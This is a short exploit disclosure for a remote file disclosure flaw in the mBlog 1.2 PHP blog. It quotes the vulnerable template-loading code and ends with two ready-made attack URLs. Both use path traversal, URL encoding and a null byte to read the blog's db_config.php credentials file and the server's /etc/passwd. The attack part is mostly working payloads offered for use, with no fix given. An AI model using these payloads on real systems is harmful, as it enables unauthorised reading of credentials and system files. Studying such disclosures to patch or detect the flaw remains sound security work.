mBlog 1.2 (page) Remote File Disclosure Vulnerability
=====================================================



:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:                                                                             :
:  vuln.: mBlog 1.2 Remote File Disclosure Vulnerability                      :
:  no dork for s-kiddie [;                                                    :
:                                                                             :
:  greets to: str0ke, wacky, wszystkich polakA?w ;]                           :
:                                                                             :
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

# code:

  ./includes/tpl.php, 41-56:
    ...
41   // load_tpl
42   // loding a template file into a varible.
43   // use quick_tpl to display template
44  function load_tpl ($path)
45  {
46	  $tpl = &#039;&#039;;
47	  global $tpl_block;
48
49	  if (substr ($path, -4) == &#039;.tpl&#039;)
50	  {
51		  if (strpos (Cur_Url (), &#039;includes%2F&#039;) OR strpos (Cur_Url (), &#039;admin%2F&#039;) OR strpos (Cur_Url (), &#039;members%2F&#039;)) $path = &#039;../&#039;.$path;
52		  if (!file_exists ($path)) die ("<B>Template $path not found! Contact webmaster.</B>");
53		  $fp = fopen($path,&#039;r&#039;);
54		  while(!feof($fp)) $tpl .= fgets($fp,4096);
55		  fclose ($fp);
56	  }
    ...

load_tpl() &#039;loading a template file into a varible.&#039; ;]


  ./index.php, 24-30:
    ...
24   // proses cmd
25   switch ($mode)
26   {
27	  case &#039;page&#039;:
28	   $txt[&#039;main_body&#039;] = quick_tpl (load_tpl ($config[&#039;skin&#039;]."/$page.tpl"), 0);
29	   flush_tpl ();
30	  break;
    ...
	
file disclosure in $page :*

# exploit:

(%69%6E%63%6C%75%64%65%73 = includes)
http://[host]/[path]/index.php?mode=page&page=../../%69%6E%63%6C%75%64%65%73/db_config.php%00
http://[host]/[path]/index.php?mode=page&page=../../../../../../../../etc/passwd%00



